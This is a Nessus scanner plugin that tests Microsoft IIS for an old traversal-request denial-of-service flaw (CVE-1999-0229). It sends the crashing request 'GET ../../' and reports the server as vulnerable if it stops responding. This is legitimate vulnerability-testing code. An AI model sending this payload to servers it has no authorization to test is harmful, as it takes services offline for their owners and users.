#
# (C) Tenable Network Security, Inc.
#

include("compat.inc");
if(description)
{
 script_id(10117);
 script_version ("$Revision: 1.32 $");
 script_cve_id("CVE-1999-0229");
 script_bugtraq_id(2218);
 script_osvdb_id(55269);

 script_name(english:"Microsoft IIS Traversal GET Request Remote DoS");
 
 script_set_attribute(attribute:"synopsis", value:
"The remote web server is vulnerable to a Denial of Service attack");
 script_set_attribute(attribute:"description", value:
"It is possible to crash IIS by sending the request GET ../../'");
 script_set_attribute(attribute:"solution", value:
"Upgrade to the latest version.");
 script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:N/I:N/A:P");
 script_set_cvss_temporal_vector("CVSS2#E:F/RL:OF/RC:C");
 script_set_attribute(attribute:"plugin_publication_date", value: "1999/06/22");
 script_cvs_date("$Date: 2011/06/01 16:25:55 $");
 script_set_attribute(attribute:"plugin_type", value:"remote");
 script_set_attribute(attribute:"cpe", value:"cpe:/a:microsoft:iis");
 script_end_attributes();

 script_summary(english:"Performs a denial of service against IIS");
 script_category(ACT_DENIAL);
 script_dependencie("find_service1.nasl", "http_version.nasl", "www_fingerprinting_hmap.nasl");
 script_family(english:"Web Servers");
 script_copyright(english:"This script is Copyright (C) 1999-2011 Tenable Network Security, Inc.");
 script_require_ports("Services/www", 80);
 exit(0);
}

# The attack starts here
include("global_settings.inc");
include("misc_func.inc");
include("http.inc");
 
port = get_http_port(default:80, embedded: 0);

banner = get_http_banner(port: port);
if ("IIS" >!< banner) exit(0);
if(http_is_dead(port: port)) exit(0);

r = http_send_recv_buf(port: port, data: 'GET ../../\r\n');
sleep(2);

if (http_is_dead(port: port, retry: 3)) security_warning(port);
